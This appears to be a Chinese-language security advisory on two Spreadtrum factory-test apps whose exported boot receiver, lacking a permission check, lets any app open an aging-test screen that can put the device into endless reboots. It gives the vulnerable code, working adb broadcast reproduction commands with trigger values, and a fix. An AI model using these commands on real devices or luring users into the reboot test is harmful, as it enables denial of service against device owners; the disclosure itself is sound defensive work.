# V11 / V12 — `PhoneBootReceiver` 任意拉起老化测试（含 Reboot）

| 项 | V11 | V12 |
|----|-----|-----|
| **严重性** | 🟠 高 | 🟠 高 |
| **CWE** | CWE-862 | CWE-862 |
| **应用** | `com.sprd.agingtest` | `com.sprd.factorytest` |
| **UID** | 1000 | 1000 |
| **组件** | `com.sprd.agingtest.PhoneBootReceiver` | `com.sprd.factorytest.PhoneBootReceiver` |
| **exported** | true | true |
| **permission** | 无 | 无 |
| **触发码** | `123456` | `1234` / `0001234` |
| **实机验证** | ✅ | ✅ |

---

## 1. 摘要

两个包的 `PhoneBootReceiver` 虽然名为「开机广播接收器」，但其 URI 判断逻辑
**不受 action 限制**。任何应用发送一个带特定 host 的 Intent，即可拉起
`AgingTest` 界面。

老化测试界面包含 **Reboot / Sleep / Vibrate / Receiver / Camera / Video /
Memory / Circulation** 等压测项，`RebootTest.startTest()` 会直接调用：

```java
PowerManager pm = (PowerManager) activity.getSystemService("power");
pm.reboot("test");   // ← system UID 具备 REBOOT 权限
```

配合社工诱导用户点击 Start，可造成**设备无限重启**。

## 2. 漏洞代码

```java
// com.sprd.agingtest.PhoneBootReceiver
public void onReceive(Context context, Intent intent) {
    if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
        ...                       // 这段有 action 判断
    }

    // ↓↓↓ 以下逻辑不受 action 限制 ↓↓↓
    long startTime    = prefs.getLong("startTime", ...);
    boolean isRebootTest = prefs.getBoolean("reboot", false);
    if (isRebootTest) {
        if (elapsed >= rebootTime) {
            startActivity(AgingTest);       // 恢复中断的测试
        } else {
            pm.reboot("");                   // ← 继续重启循环!
        }
    }

    Uri uri = intent.getData();
    if (uri == null) return;
    String host = uri.getHost();
    if ("123456".equals(host)) {             // ← 外部可控入口
        i.setClass(context, AgingTest.class);
        context.startActivity(i);
    }
}
```

`com.sprd.factorytest` 版本逻辑相同，触发码为 `1234` / `0001234`。

## 3. 影响

1. **任意应用可拉起工厂压测界面**（可被用于钓鱼/诱导）
2. 若设备处于重启测试循环中（`reboot=true`），**每次任意广播都会触发重启判断**
3. 配合社工点击 Start+ 勾选 Reboot → **无限重启，设备变砖风险**
4. 真实工厂模式暴露给第三方应用，可被用作供应链攻击链的一环

## 4. 复现

```bash
# V11 - agingtest
adb shell am broadcast -a android.intent.action.MAIN \
  -n com.sprd.agingtest/com.sprd.agingtest.PhoneBootReceiver \
  -d "https://123456/"

# V12 - factorytest
adb shell am broadcast -a android.intent.action.MAIN \
  -n com.sprd.factorytest/com.sprd.factorytest.PhoneBootReceiver \
  -d "https://1234/"
```

实机结果：两包均能成功拉起 `AgingTest` 界面。

> ⚠️ **不要**在界面上点击 Start、不要勾选 Reboot，否则设备会持续重启。

## 5. 修复建议

```xml
<receiver android:name=".PhoneBootReceiver"
          android:exported="false" />
```

若产线需要 URI 入口，应加 `signature` 级权限，并把 URI 判断移入
`if (BOOT_COMPLETED.equals(action))` 代码块内部。
